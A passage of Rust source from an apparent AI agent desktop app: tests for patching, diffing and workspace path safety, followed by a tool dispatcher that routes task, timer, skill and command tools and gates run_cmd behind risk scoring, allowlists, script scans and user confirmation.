    fn patch_fuzz_applies_when_edge_context_changed() {
        use super::apply_unified_patch;

        let original = "prefix changed\nb\nc\nd\n";
        // The first context line no longer matches the file; fuzz drops it.
        let patch = "@@ -1,4 +1,4 @@\n prefix\n b\n-c\n+C\n d\n";
        let (result, notes) = apply_unified_patch(original, patch).unwrap();
        assert_eq!(result, "prefix changed\nb\nC\nd\n");
        assert!(
            notes.iter().any(|note| note.contains("fuzz")),
            "notes should mention fuzz: {notes:?}"
        );
    }

    // ─── Diff Tests ────────────────────────────────────────────────────────

    #[test]
    fn diff_reports_added_and_removed_lines() {
        use super::build_file_diff;

        let diff = build_file_diff(
            "a.txt",
            "b.txt",
            "line1\nline2\nline3\n",
            "line1\nline2 changed\nline3\nline4\n",
            3,
            false,
        )
        .expect("the two inputs differ");

        assert_eq!(diff.added, 2);
        assert_eq!(diff.removed, 1);
        // The two edit blocks are one context line apart, so with the default
        // 3 lines of context they collapse into a single hunk.
        assert_eq!(diff.hunks, 1);
        assert!(diff.text.starts_with("--- a.txt\n+++ b.txt\n"));
        assert!(diff.text.contains("@@ -"));
        assert!(diff.text.contains("-line2\n"));
        assert!(diff.text.contains("+line2 changed\n"));
        assert!(diff.text.contains("+line4\n"));
    }

    #[test]
    fn diff_returns_none_for_identical_files() {
        use super::build_file_diff;

        assert!(
            build_file_diff("a", "b", "same\ncontent\n", "same\ncontent\n", 3, false).is_none()
        );
    }

    #[test]
    fn diff_ignores_line_ending_and_bom_differences() {
        use super::build_file_diff;

        // A CRLF/LF or BOM-only difference would otherwise be reported as a
        // full-file rewrite, which is noise rather than signal.
        assert!(
            build_file_diff("a", "b", "line1\r\nline2\r\n", "line1\nline2\n", 3, false).is_none()
        );
        assert!(build_file_diff("a", "b", "\u{feff}line1\n", "line1\n", 3, false).is_none());
    }

    #[test]
    fn diff_can_ignore_whitespace_only_changes() {
        use super::build_file_diff;

        let (original, modified) = ("let  x  =  1;\n", "let x = 1;\n");
        assert!(build_file_diff("a", "b", original, modified, 3, false).is_some());
        assert!(build_file_diff("a", "b", original, modified, 3, true).is_none());
    }

    #[test]
    fn diff_honours_context_lines() {
        use super::build_file_diff;

        let (original, modified) = (
            "a\nb\nc\nd\ne\nf\ng\nh\ni\nj\n",
            "a\nb\nc\nd\nCHANGED\ne\nf\ng\nh\ni\nj\n",
        );
        let wide = build_file_diff("a", "b", original, modified, 5, false).unwrap();
        let narrow = build_file_diff("a", "b", original, modified, 0, false).unwrap();

        assert!(wide.text.len() > narrow.text.len());
        assert_eq!((wide.added, wide.removed), (narrow.added, narrow.removed));
    }

    // ─── Path Safety Tests ─────────────────────────────────────────────────

    #[test]
    fn ensure_mutation_target_allowed_rejects_workspace_root() {
        use super::ensure_mutation_target_allowed;

        let workspace_root = make_temp_dir("mutation-root");
        let err = ensure_mutation_target_allowed(&workspace_root, &workspace_root, None, "delete")
            .unwrap_err();
        assert!(err.contains("workspace root"));

        let _ = fs::remove_dir_all(&workspace_root);
    }

    #[test]
    fn ensure_mutation_target_allowed_rejects_the_workspace_database() {
        use super::ensure_mutation_target_allowed;

        let workspace_root = make_temp_dir("mutation-data");
        let data_root = workspace_root.join(".data");
        let db = data_root.join("chat.db");
        fs::create_dir_all(&data_root).unwrap();
        fs::write(&db, "sqlite").unwrap();

        // The database cannot be truncated or deleted through the file tools.
        for action in ["write", "delete", "patch"] {
            let err =
                ensure_mutation_target_allowed(&db, &workspace_root, None, action).unwrap_err();
            assert!(
                err.contains("database"),
                "unexpected error for {action}: {err}"
            );
        }

        // Its SQLite sidecars are protected as well.
        for sidecar in ["chat.db-wal", "chat.db-shm", "chat.db-journal"] {
            let err = ensure_mutation_target_allowed(
                &data_root.join(sidecar),
                &workspace_root,
                None,
                "delete",
            )
            .unwrap_err();
            assert!(err.contains("database"), "unexpected error: {err}");
        }

        let _ = fs::remove_dir_all(&workspace_root);
    }

    #[test]
    fn ensure_mutation_target_allowed_allows_the_workspace_state_folder() {
        use super::ensure_mutation_target_allowed;

        let workspace_root = make_temp_dir("mutation-state");
        let data_root = workspace_root.join(".data");
        let files = [
            data_root.join("memory").join("repo").join("note.md"),
            data_root.join("todos").join("sess").join("lists").join("list.json"),
            data_root.join("skills.status"),
        ];
        for file in &files {
            fs::create_dir_all(file.parent().unwrap()).unwrap();
            fs::write(file, "x").unwrap();
        }

        // `.data` lives inside the workspace: it is part of the file tool's
        // scope, so the assistant may read and manage its own state there.
        for file in &files {
            assert!(
                ensure_mutation_target_allowed(file, &workspace_root, None, "write").is_ok(),
                "expected {} to be writable",
                file.display()
            );
        }

        let _ = fs::remove_dir_all(&workspace_root);
    }

    #[test]
    fn ensure_mutation_target_allowed_allows_the_skills_root_in_self_evolution() {
        use super::ensure_mutation_target_allowed;

        let workspace_root = make_temp_dir("mutation-skills");
        let data_root = workspace_root.join(".data");
        let writable_root = data_root.join("skills");
        let skill_file = writable_root.join("demo").join("skill.md");
        fs::create_dir_all(skill_file.parent().unwrap()).unwrap();
        fs::write(&skill_file, "x").unwrap();

        assert!(ensure_mutation_target_allowed(
            &skill_file,
            &workspace_root,
            Some(&writable_root),
            "write"
        )
        .is_ok());

        let _ = fs::remove_dir_all(&workspace_root);
    }

    #[cfg(unix)]
    #[test]
    fn resolve_safe_path_rejects_symlink_escape_for_new_file() {
        use std::os::unix::fs::symlink;

        let workspace_root = make_temp_dir("resolve-safe-symlink");
        let external_root = make_temp_dir("resolve-safe-symlink-ext");
        let link = workspace_root.join("link");
        symlink(&external_root, &link).unwrap();

        // Absolute path through a symlinked parent to a non-existent file.
        let target = link.join("newfile.txt");
        let err =
            super::resolve_safe_path(&workspace_root, &target.display().to_string()).unwrap_err();
        assert!(err.contains("escapes workspace"));

        // Relative path through a symlinked parent to a non-existent file.
        let err = super::resolve_safe_path(&workspace_root, "./link/newfile.txt").unwrap_err();
        assert!(err.contains("escapes workspace"));

        let _ = fs::remove_dir_all(&workspace_root);
        let _ = fs::remove_dir_all(&external_root);
    }

    #[cfg(unix)]
    #[test]
    fn resolve_safe_path_allows_new_file_inside_workspace() {
        use std::os::unix::fs::symlink;

        let workspace_root = make_temp_dir("resolve-safe-newfile");
        let subdir = workspace_root.join("sub");
        fs::create_dir_all(&subdir).unwrap();

        // New file in a normal subdirectory resolves to the canonical parent.
        let resolved = super::resolve_safe_path(&workspace_root, "./sub/newfile.txt").unwrap();
        assert!(resolved.starts_with(&workspace_root));
        assert_eq!(resolved.file_name().unwrap(), "newfile.txt");

        // New file through a symlink that stays inside the workspace is allowed.
        let inner = workspace_root.join("inner");
        fs::create_dir_all(&inner).unwrap();
        let link = workspace_root.join("link");
        symlink(&inner, &link).unwrap();
        let resolved = super::resolve_safe_path(&workspace_root, "./link/newfile.txt").unwrap();
        assert!(resolved.starts_with(&workspace_root));

        let _ = fs::remove_dir_all(&workspace_root);
    }

    /// Regression for the two traps the throwaway benchmark walked into:
    /// a match that starts mid-line must still be reported as a
    /// `path:line:text` row, and the parallel walker must return every
    /// matching line of a multi-file tree in a deterministic order — as long
    /// as the budget allows it.
    #[test]
    fn search_reports_mid_line_matches_across_many_files() {
        let root = make_temp_dir("search-many-files");
        let dir = root.join("tree");
        fs::create_dir_all(&dir).unwrap();

        let file_count = 128usize;
        let body: String = (0..60)
            .map(|i| {
                if i % 7 == 0 {
                    format!("line {i} needle here padding padding padding\n")
                } else {
                    format!("line {i} nothing to see padding padding padding\n")
                }
            })
            .collect();
        for i in 0..file_count {
            fs::write(dir.join(format!("f{i:04}.txt")), &body).unwrap();
        }

        // Every `i % 7 == 0` line carries the needle mid-line (9 per file).
        let mut expected: Vec<String> = Vec::new();
        for i in 0..file_count {
            for line in (0..60).step_by(7) {
                expected.push(format!(
                    "tree/f{i:04}.txt:{}:line {line} needle here padding padding padding",
                    line + 1
                ));
            }
        }
        expected.sort();

        let output = run_integrated_search(
            "needle",
            &dir,
            &root,
            &SearchOptions {
                // Large enough for the whole tree (128 × 9 = 1 152 rows).
                max_matches: 20_000,
                ..SearchOptions::default()
            },
        )
        .unwrap();

        let rows: Vec<String> = output.lines().map(str::to_string).collect();
        assert_eq!(rows, expected);
        // Nothing was dropped, so no budget footer may appear.
        assert!(!output.contains("[search]"));

        let _ = fs::remove_dir_all(&root);
    }
}

/// Emits one tool-progress line, scoped to the caller.
///
/// The main chat owns the `tool-call` transcript event: its listener settles
/// the running step and appends a row. A sub-agent mission must never write
/// there — that would settle the task's *own* row to "done" while it is still
/// working and add a stray main-chat row. Mission progress goes out as
/// `agent-task-tool`, which the UI applies to the task row without touching its
/// status.
pub(crate) fn emit_tool_progress(
    app: &AppHandle,
    mission_id: Option<&str>,
    text: impl Into<String>,
) {
    match mission_id {
        Some(task_id) => {
            let _ = app.emit(
                "agent-task-tool",
                json!({ "task_id": task_id, "phase": "progress", "text": text.into() }),
            );
        }
        None => {
            let _ = app.emit("tool-call", text.into());
        }
    }
}

/// Execute one `run_cmd` invocation after every gate (syntax, risk, script
/// safety) has passed.
///
/// A library script runs as interpreter + path + arguments, so the path is one
/// `Command` argument and never re-parsed as shell syntax. Anything else goes
/// through the historical `direct` command path, now with the script library
/// prepended to `PATH`.
#[allow(clippy::too_many_arguments)]
async fn run_run_cmd(
    workspace_dir: &Path,
    scripts_dir: &Path,
    resolved: Option<&scripts::ResolvedScript>,
    parts: &[String],
    command: &str,
    cwd: PathBuf,
    timeout_secs: u64,
    cancel: Option<std::sync::Arc<std::sync::atomic::AtomicBool>>,
) -> String {
    match resolved {
        Some(script) => {
            let (program, args) = script.command_parts(&parts[1..]);
            let output = process::run_program_timed(
                program,
                args,
                Some(cwd),
                timeout_secs,
                cancel,
                Some(scripts_dir),
            )
            .await;
            scripts::record_use(workspace_dir, &script.entry.file_name, &output);
            output
        }
        None => {
            process::run_command_timed(
                "direct".to_string(),
                command.to_string(),
                Some(cwd),
                timeout_secs,
                cancel,
                Some(scripts_dir),
            )
            .await
        }
    }
}

pub async fn execute_tool(
    app: &AppHandle,
    name: &str,
    args_str: &str,
    workspace_dir: PathBuf,
    config: &crate::AppConfig,
    // Allowlist of executable names from the active skill (empty = unrestricted).
    allowed_commands: &[String],
    // The one skill root that self-evolution mode makes writable. It requires
    // automatic `.bak.N` backups before mutation. `None` = nothing outside the
    // workspace is writable.
    protected_skill_root: Option<&Path>,
    // Current autonomous mission identifier when executing inside a sub-agent.
    mission_id: Option<&str>,
    // Current chat session id (used by session-scoped helpers like the `todos` tool).
    session_id: Option<&str>,
    // Active skill directories accessible via skill_read tool (empty = tool not available).
    active_skill_dirs: &[(String, PathBuf)],
    // Cancel flag of the background task this call belongs to (`None` for a
    // normal foreground call). Only the long-running tools observe it.
    cancel: Option<&std::sync::Arc<std::sync::atomic::AtomicBool>>,
    // Working directory of the caller when it differs from the workspace root
    // (a sub-agent mission's task directory). Only process launches use it —
    // `file_actions` / memory / todos stay rooted at `workspace_dir`.
    working_dir: Option<&Path>,
) -> String {
    let args: Value = serde_json::from_str(args_str).unwrap_or_default();
    let tool_output = match name {
        "add_task" => {
            let Some(mission_id) = mission_id else {
                return "Error: add_task is only available inside an autonomous sub-agent mission."
                    .to_string();
            };
            let description = args["description"].as_str().unwrap_or("");
            let name = args["name"].as_str().unwrap_or(description);
            let state = app.state::<crate::AppState>();
            let db = match state.db.lock() {
                Ok(db) => db,
                Err(err) => return format!("Error: failed to lock mission database: {err}"),
            };
            match crate::agents::add_mission_task(&db, mission_id, name, description) {
                Ok(task) => {
                    let payload = json!({
                        "mission_id": mission_id,
                        "task": task,
                    });
                    let _ = app.emit("agent-task-state", payload.clone());
                    serde_json::to_string_pretty(&payload).unwrap_or_else(|_| payload.to_string())
                }
                Err(err) => format!("Error: {err}"),
            }
        }
        "update_task_status" => {
            let Some(mission_id) = mission_id else {
                return "Error: update_task_status is only available inside an autonomous sub-agent mission.".to_string();
            };
            let task_id = args["task_id"].as_str().unwrap_or("");
            let status = args["status"].as_str().unwrap_or("");
            let state = app.state::<crate::AppState>();
            let db = match state.db.lock() {
                Ok(db) => db,
                Err(err) => return format!("Error: failed to lock mission database: {err}"),
            };
            match crate::agents::update_mission_task_status(&db, mission_id, task_id, status) {
                Ok(task) => {
                    let payload = json!({
                        "mission_id": mission_id,
                        "task": task,
                    });
                    let _ = app.emit("agent-task-state", payload.clone());
                    serde_json::to_string_pretty(&payload).unwrap_or_else(|_| payload.to_string())
                }
                Err(err) => format!("Error: {err}"),
            }
        }
        "get_active_tasks" => {
            let Some(mission_id) = mission_id else {
                return "Error: get_active_tasks is only available inside an autonomous sub-agent mission.".to_string();
            };
            let state = app.state::<crate::AppState>();
            let db = match state.db.lock() {
                Ok(db) => db,
                Err(err) => return format!("Error: failed to lock mission database: {err}"),
            };
            match crate::agents::get_active_mission_tasks(&db, mission_id) {
                Ok(tasks) => serde_json::to_string_pretty(&json!({
                    "mission_id": mission_id,
                    "active_tasks": tasks,
                }))
                .unwrap_or_else(|_| "[]".to_string()),
                Err(err) => format!("Error: {err}"),
            }
        }
        "mark_mission_accomplished" => {
            let Some(mission_id) = mission_id else {
                return "Error: mark_mission_accomplished is only available inside an autonomous sub-agent mission.".to_string();
            };
            let final_report = args["final_report"].as_str();
            let state = app.state::<crate::AppState>();
            let db = match state.db.lock() {
                Ok(db) => db,
                Err(err) => return format!("Error: failed to lock mission database: {err}"),
            };
            match crate::agents::mark_mission_accomplished(&db, mission_id, final_report) {
                Ok(()) => {
                    let payload = json!({
                        "mission_id": mission_id,
                        "status": "completed",
                        "final_report": final_report.unwrap_or(""),
                    });
                    let _ = app.emit("agent-task-state", payload.clone());
                    serde_json::to_string_pretty(&payload).unwrap_or_else(|_| payload.to_string())
                }
                Err(err) => format!("Error: {err}"),
            }
        }
        "timer_set" => {
            let Some(session_id) = session_id else {
                return "Error: timer_set is only available in an interactive chat session."
                    .to_string();
            };
            // Accept both a JSON number and a numeric string — some models send
            // "1800" instead of 1800.
            let delay_seconds = args["delay_seconds"]
                .as_u64()
                .or_else(|| {
                    args["delay_seconds"]
                        .as_str()
                        .and_then(|raw| raw.trim().parse().ok())
                })
                .unwrap_or(0);
            let message = args["message"].as_str().unwrap_or("");
            let label = args["label"].as_str().unwrap_or("");

            match crate::timer::schedule(app, session_id, delay_seconds, label, message) {
                Ok(entry) => {
                    let _ = emit_tool_progress(
                        app,
                        mission_id,
                        format!(
                            "⏱️ *Timer set: {}*\n\n```\n{}\n```\n",
                            crate::timer::format_delay(delay_seconds),
                            entry.message
                        ),
                    );
                    let payload = json!({
                        "timer_id": entry.id,
                        "delay_seconds": delay_seconds,
                        "fires_at": crate::timer::format_fire_at(entry.fire_at),
                        "label": entry.label,
                        "message": entry.message,
                        "instructions": "The timer is armed. Tell the user when it will fire, then END YOUR TURN. Do not wait, poll, or sleep. When the timer fires the app injects `message` into this session as a new user turn, so you resume with the full conversation history.",
                    });
                    serde_json::to_string_pretty(&payload).unwrap_or_else(|_| payload.to_string())
                }
                Err(err) => format!("Error: {err}"),
            }
        }
        "timer_list" => {
            let timers = app.state::<crate::timer::TimerRegistry>().list();
            let pending: Vec<Value> = timers
                .iter()
                .map(|entry| {
                    json!({
                        "timer_id": entry.id,
                        "label": entry.label,
                        "session_id": entry.session_id,
                        "fires_at": crate::timer::format_fire_at(entry.fire_at),
                        "remaining_seconds": entry.remaining_ms() / 1000,
                        "message": entry.message,
                        "is_current_session": Some(entry.session_id.as_str()) == session_id,
                    })
                })
                .collect();
            if pending.is_empty() {
                "No pending timers.".to_string()
            } else {
                serde_json::to_string_pretty(&json!({
                    "pending_timers": pending,
                    "count": pending.len(),
                }))
                .unwrap_or_else(|_| "[]".to_string())
            }
        }
        "timer_cancel" => {
            let timer_id = args["timer_id"].as_str().unwrap_or("").trim();
            if timer_id.is_empty() {
                return "Error: 'timer_id' is required for timer_cancel.".to_string();
            }
            match crate::timer::cancel(app, timer_id) {
                Ok(entry) => {
                    let _ = emit_tool_progress(
                        app,
                        mission_id,
                        format!("⏱️ *Timer cancelled: {}*\n", entry.label),
                    );
                    format!(
                        "Timer '{}' ({}) cancelled — it will no longer resume the conversation.",
                        entry.label, entry.id
                    )
                }
                Err(err) => format!("Error: {err}"),
            }
        }
        // Self-built MCP servers (self-evolution mode only). The tool writes the
        // script under `<workspace>/.data/mcp/`, registers it in the app-data
        // registry (which `file_actions` cannot reach) and starts the stdio
        // process. Re-checked here as well as in the schema, so a hand-crafted
        // call without the advertised capability is refused.
        "mcp_self" => {
            if !config.self_evolution_mode {
                return "Error: mcp_self is only available in self-evolution mode.".to_string();
            }
            return self::mcp_self::handle(app, &args, &workspace_dir, cancel).await;
        }
        "memory" => {
            memory::handle_memory_tool(
                app,
                &args,
                session_id,
                &workspace_dir,
                config,
                allowed_commands,
                protected_skill_root,
                mission_id,
                active_skill_dirs,
            )
            .await
        }
        // The `todos` tool is a single action-based entry point (like
        // `file_actions`). Legacy per-action names are routed to the same
        // handler so chats continued from older sessions keep working.
        "todos" | "todo_add" | "todo_update_status" | "todo_list" | "todo_clear_completed"
        | "todo_archive" => todos::handle_todos_tool(app, name, &args, session_id, mission_id),
        "skill_read" => {
            let action = args["action"].as_str().unwrap_or("");
            let skill_name = args["skill_name"].as_str().unwrap_or("");
            let rel_path = args["path"].as_str().unwrap_or(".");

            if skill_name.is_empty() {
                return "Error: skill_name is required.".to_string();
            }

            // Find the skill directory
            let skill_dir = match active_skill_dirs
                .iter()
                .find(|(name, _)| name == skill_name)
            {
                Some((_, dir)) => dir.clone(),
                None => {
                    return format!(
                        "Error: skill '{}' is not active or not found. Active skills: {:?}",
                        skill_name,
                        active_skill_dirs.iter().map(|(n, _)| n).collect::<Vec<_>>()
                    );
                }
            };

            // Resolve the target path within the skill directory
            let target_path = if rel_path == "." || rel_path.is_empty() {
                skill_dir.clone()
            } else {
                let resolved = skill_dir.join(rel_path);
                // Security check: ensure the resolved path is still within the skill directory
                match (resolved.canonicalize(), skill_dir.canonicalize()) {
                    (Ok(resolved_canonical), Ok(skill_dir_canonical)) => {
                        if !resolved_canonical.starts_with(&skill_dir_canonical) {
                            return format!(
                                "Error: path '{}' escapes skill directory '{}'",
                                rel_path, skill_name
                            );
                        }
                        resolved_canonical
                    }
                    _ => {
                        // Path doesn't exist yet or can't be canonicalized, use as-is
                        if !resolved.starts_with(&skill_dir) {
                            return format!(
                                "Error: path '{}' escapes skill directory '{}'",
                                rel_path, skill_name
                            );
                        }
                        resolved
                    }
                }
            };

            match action {
                "read" => {
                    let _ = emit_tool_progress(
                        app,
                        mission_id,
                        format!("📄 *Reading skill file {}/{}*\n\n", skill_name, rel_path),
                    );

                    if !target_path.exists() {
                        return format!("Error: file '{}' does not exist in skill '{}'", rel_path, skill_name);
                    }

                    if target_path.is_dir() {
                        return format!("Error: '{}' is a directory, use action 'list' instead", rel_path);
                    }

                    let start_line = args["start_line"].as_i64();
                    let end_line = args["end_line"].as_i64();

                    if start_line.is_none() && end_line.is_none() {
                        return fs::read_to_string(&target_path)
                            .map(truncate_tool_output)
                            .unwrap_or_else(|e| format!("Error reading file: {}", e));
                    }

                    let start = start_line.unwrap_or(1);
                    let end = end_line.unwrap_or(i64::MAX);
                    if start <= 0 || end < start {
                        return "Error: invalid line range. start_line must be >= 1 and end_line must be >= start_line.".to_string();
                    }

                    match fs::File::open(&target_path) {
                        Ok(file) => {
                            let reader = BufReader::new(file);
                            let mut result = String::new();
                            for (index, line) in reader.lines().enumerate() {
                                let line_num = (index + 1) as i64;
                                if line_num < start {
                                    continue;
                                }
                                if line_num > end {
                                    break;
                                }
                                match line {
                                    Ok(text) => {
                                        if !result.is_empty() {
                                            result.push('\n');
                                        }
                                        result.push_str(&text);
                                    }
                                    Err(e) => {
                                        return format!("Error reading file: {}", e);
                                    }
                                }
                            }
                            if result.is_empty() {
                                "(no matching lines)".to_string()
                            } else {
                                result
                            }
                        }
                        Err(e) => format!("Error opening file: {}", e),
                    }
                }
                "list" => {
                    let _ = emit_tool_progress(
                        app,
                        mission_id,
                        format!("📂 *Listing skill directory {}/{}*\n\n", skill_name, rel_path),
                    );

                    if !target_path.exists() {
                        return format!("Error: directory '{}' does not exist in skill '{}'", rel_path, skill_name);
                    }

                    if !target_path.is_dir() {
                        // It's a file, return file info
                        match fs::metadata(&target_path) {
                            Ok(metadata) => {
                                let name = target_path
                                    .file_name()
                                    .and_then(|n| n.to_str())
                                    .unwrap_or(rel_path)
                                    .to_string();
                                return with_root_header(format!(
                                    "{} ({} bytes)",
                                    name,
                                    metadata.len()
                                ));
                            }
                            Err(e) => return format!("Error reading file metadata: {}", e),
                        }
                    }

                    match fs::read_dir(&target_path) {
                        Ok(entries) => {
                            let mut res = Vec::new();
                            for entry in entries.flatten() {
                                if let Ok(name) = entry.file_name().into_string() {
                                    let is_dir = entry
                                        .file_type()
                                        .map(|t| t.is_dir())
                                        .unwrap_or(false);
                                    if is_dir {
                                        res.push(format!("{}/", name));
                                    } else {
                                        let size = entry.metadata().map(|m| m.len()).unwrap_or(0);
                                        res.push(format!("{} ({} bytes)", name, size));
                                    }
                                }
                            }
                            let body = if res.is_empty() {
                                "(empty directory)".to_string()
                            } else {
                                res.join("\n")
                            };
                            with_root_header(body)
                        }
                        Err(e) => format!("Error listing directory: {}", e),
                    }
                }
                "search" => {
                    let query = args["query"].as_str().unwrap_or("").to_string();
                    let options = SearchOptions {
                        recursive: args["recursive"].as_bool().unwrap_or(true),
                        case_sensitive: args["case_sensitive"].as_bool().unwrap_or(false),
                        smart_case: args["smart_case"].as_bool().unwrap_or(false),
                        use_regex: args["use_regex"].as_bool().unwrap_or(false),
                        include_hidden: args["include_hidden"].as_bool().unwrap_or(true),
                        respect_gitignore: args["respect_gitignore"].as_bool().unwrap_or(false),
                        glob: args["glob"].as_str().map(str::to_string),
                        max_matches: args["max_results"]
                            .as_u64()
                            .map(|value| value.clamp(1, 20_000) as usize)
                            .unwrap_or(SEARCH_MAX_MATCHES),
                        abort: None,
                    };

                    if query.is_empty() {
                        return "Error: query is required for search.".to_string();
                    }

                    let _ = emit_tool_progress(
                        app,
                        mission_id,
                        format!(
                            "🔎 *Searching skill {} for {}*\n\n",
                            skill_name,
                            serde_json::to_string(&query).unwrap_or_else(|_| query.to_string())
                        ),
                    );

                    if !target_path.exists() {
                        return format!("Error: path '{}' does not exist in skill '{}'", rel_path, skill_name);
                    }

                    let search_root = skill_dir.clone();
                    let outcome = tauri::async_runtime::spawn_blocking(move || {
                        run_integrated_search(&query, &target_path, &search_root, &options)
                    })
                    .await
                    .unwrap_or_else(|e| Err(format!("Search task failed: {}", e)));

                    match outcome {
                        Ok(output) => with_root_header(output),
                        Err(e) => format!("Error: {}", e),
                    }
                }
                _ => format!("Unknown action '{}' for skill_read tool. Supported actions: read, list, search", action),
            }
        }
        "run_cmd" => {
            let action = args["action"]
                .as_str()
                .unwrap_or("run")
                .trim()
                .to_ascii_lowercase();

            // ── Script library listing ────────────────────────────────────────
            if action == "list" {
                return scripts::render_list(&workspace_dir);
            }
            if action != "run" {
                return format!(
                    "Error: unsupported run_cmd action '{}'. Supported actions: run, list",
                    action
                );
            }

            let command = args["command"].as_str().unwrap_or("").trim().to_string();
            let command_cwd = working_dir
                .map(Path::to_path_buf)
                .unwrap_or_else(|| workspace_dir.clone());

            if command.is_empty() {
                return "Error: run_cmd requires a non-empty 'command' argument when action is 'run'."
                    .to_string();
            }

            // Split once: the first token addresses either the workspace script
            // library or a PATH-resolved program; the rest are its arguments.
            let parts = split_command_line(&command);
            let program = parts.first().map(|s| s.as_str()).unwrap_or("");

            // ── PATH-resolved program only ───────────────────────────────────
            // `run_cmd` runs a bare name the OS resolves through `PATH`
            // (`python`, `python3`, `git`, …) or a library script name.
            // Absolute and relative paths are refused — `run_shell` is the tool
            // that may run any script, from anywhere, under the risk audit.
            if let Err(e) = process::validate_path_resolved_program(program) {
                return e;
            }

            let scripts_dir = crate::workspace::scripts_root(&workspace_dir);
            let resolved = match scripts::resolve(&workspace_dir, program) {
                Ok(resolved) => resolved,
                Err(err) => return format!("⛔ {err}"),
            };

            // ── Allowed-commands enforcement (skill context) ──────────────────
            // A library script is allowed by its command name, its file name or
            // the interpreter that runs it.
            if !allowed_commands.is_empty() {
                let exe_name = Path::new(program)
                    .file_stem()
                    .and_then(|s| s.to_str())
                    .unwrap_or(program)
                    .to_lowercase();
                let mut permitted = allowed_commands
                    .iter()
                    .any(|a| a.eq_ignore_ascii_case(&exe_name));
                if let Some(script) = &resolved {
                    permitted = permitted
                        || allowed_commands
                            .iter()
                            .any(|a| a.eq_ignore_ascii_case(&script.entry.name))
                        || allowed_commands
                            .iter()
                            .any(|a| a.eq_ignore_ascii_case(&script.entry.file_name))
                        || allowed_commands
                            .iter()
                            .any(|a| a.eq_ignore_ascii_case(script.entry.interpreter.program_name()));
                }
                if !permitted {
                    return format!(
                        "⛔ Command '{}' is not in this skill's allowed-commands list ({}).",
                        exe_name,
                        allowed_commands.join(", ")
                    );
                }
            }

            // ── Patent-compliant risk assessment ──────────────────────────────
            let request_id = format!(
                "req-{}",
                uuid::Uuid::new_v4()
                    .to_string()
                    .split('-')
                    .next()
                    .unwrap_or("unknown")
            );
            let report = generate_risk_report("direct", &command, &request_id);

            // ── Syntax Gate: reject invalid scripts before execution ─────────
            if report.syntax_check.status == "failed" {
                let error_details: Vec<String> = report
                    .syntax_check
                    .syntax_errors
                    .iter()
                    .map(|e| {
                        format!(
                            "  - Line {}:{}: {} ({})",
                            e.line, e.column, e.message, e.error_type
                        )
                    })
                    .collect();

                // Emit syntax error event for frontend
                let _ = app.emit(
                    "syntax-error",
                    serde_json::json!({
                        "request_id": request_id,
                        "cmd_type": "direct",
                        "code": command,
                        "syntax_errors": report.syntax_check.syntax_errors,
                        "report": report,
                    }),
                );

                return format!(
                    "⛔ Syntax gate blocked: the script is syntactically invalid and will not run\n\n\
                    Error details:\n{}\n\n\
                    Fix suggestions:\n{}\n\n\
                    Structured report:\n```json\n{}\n```",
                    error_details.join("\n"),
                    report.syntax_check.syntax_errors
                        .iter()
                        .map(|e| format!("  - {}", e.suggestion))
                        .collect::<Vec<_>>()
                        .join("\n"),
                    serde_json::to_string_pretty(&report).unwrap_or_default()
                );
            }

            let risk_level = score_to_risk_level(report.risk_score);

            // ── Script body safety scan ───────────────────────────────────────
            // The command line cannot show what a script does. Scan the resolved
            // script and every script passed to an interpreter as an argument.
            // A clean scan needs no approval; a hit is approved once per exact
            // content hash and re-prompts after the file changes.
            let mut scan_targets: Vec<PathBuf> = Vec::new();
            if let Some(script) = &resolved {
                scan_targets.push(script.path.clone());
            }
            for path in
                scripts::referenced_scripts(&workspace_dir, &command_cwd, &parts[1..])
            {
                if !scan_targets.contains(&path) {
                    scan_targets.push(path);
                }
            }

            let mut scans: Vec<scripts::ScriptScan> = Vec::new();
            for path in &scan_targets {
                match scripts::scan(path) {
                    Ok(scan) => scans.push(scan),
                    Err(err) => return format!("⛔ Script safety scan failed: {err}"),
                }
            }

            let unapproved: Vec<&scripts::ScriptScan> = scans
                .iter()
                .filter(|scan| {
                    !scan.hits.is_empty()
                        && !scripts::is_approved(&workspace_dir, &scan.file_name, &scan.hash)
                })
                .collect();

            let script_scan_hits: Vec<Value> = scans
                .iter()
                .filter(|scan| !scan.hits.is_empty())
                .map(|scan| {
                    json!({
                        "file": scan.file_name,
                        "hash": scan.hash,
                        "approved": scripts::is_approved(
                            &workspace_dir,
                            &scan.file_name,
                            &scan.hash,
                        ),
                        "hits": scan.hits,
                    })
                })
                .collect();
            let script_label = resolved
                .as_ref()
                .map(|script| script.entry.file_name.clone());

            // ── Emit risk assessment event for frontend display ───────────────
            let _ = app.emit(
                "risk-assessment",
                serde_json::json!({
                    "request_id": request_id,
                    "cmd_type": "direct",
                    "code": command,
                    "risk_level": report.risk_level,
                    "risk_score": report.risk_score,
                    "disposition": report.disposition,
                    "recommendation": report.recommendation,
                    "blacklist_hits": report.blacklist_hits,
                    "penalty_items": report.penalty_items,
                    "requires_confirmation": !risk_level.is_auto_approvable()
                        || !unapproved.is_empty(),
                    "script": script_label,
                    "script_scan_hits": script_scan_hits,
                    "report": &report,
                }),
            );

            let needs_risk_confirmation = !risk_level.is_auto_approvable();
            let timeout_secs = args["timeout_seconds"]
                .as_i64()
                .unwrap_or(30)
                .clamp(1, 3600) as u64;

            // ── L5/L6 + clean script: run directly ────────────────────────────
            if !needs_risk_confirmation && unapproved.is_empty() {
                let _ = emit_tool_progress(
                    app,
                    mission_id,
                    format!(
                        "✅ *Risk assessment passed: {} (score: {}) - running directly*\n\n```\n{}\n```\n\n",
                        report.risk_level, report.risk_score, command
                    ),
                );

                return run_run_cmd(
                    &workspace_dir,
                    &scripts_dir,
                    resolved.as_ref(),
                    &parts,
                    &command,
                    command_cwd,
                    timeout_secs,
                    cancel.cloned(),
                )
                .await;
            }

            // ── One dialog for the command risk and the script content ────────
            // Both checks describe the same execution; asking twice for one run
            // would be noise. The script findings are included only when this
            // exact content was never approved.
            let mut reason = String::new();
            if needs_risk_confirmation {
                reason.push_str(&format!(
                    "Risk assessment: {} (score: {})\nDisposition: {}\n\nMatched rules:\n{}\n\nPenalty items:\n{}",
                    report.risk_level,
                    report.risk_score,
                    report.disposition,
                    report.blacklist_hits.iter()
                        .map(|h| format!("  - [{}] {}: {}", h.rule_id, h.severity, h.matched))
                        .collect::<Vec<_>>()
                        .join("\n"),
                    report.penalty_items.iter()
                        .map(|p| format!("  - {}: +{}", p.name, p.points))
                        .collect::<Vec<_>>()
                        .join("\n")
                ));
            }
            if !unapproved.is_empty() {
                if !reason.is_empty() {
                    reason.push_str("\n\n");
                }
                reason.push_str(
                    "Script safety scan: the script body contains destructive or sensitive patterns. \
                     Approving remembers this exact content until the file changes.\n",
                );
                for scan in &unapproved {
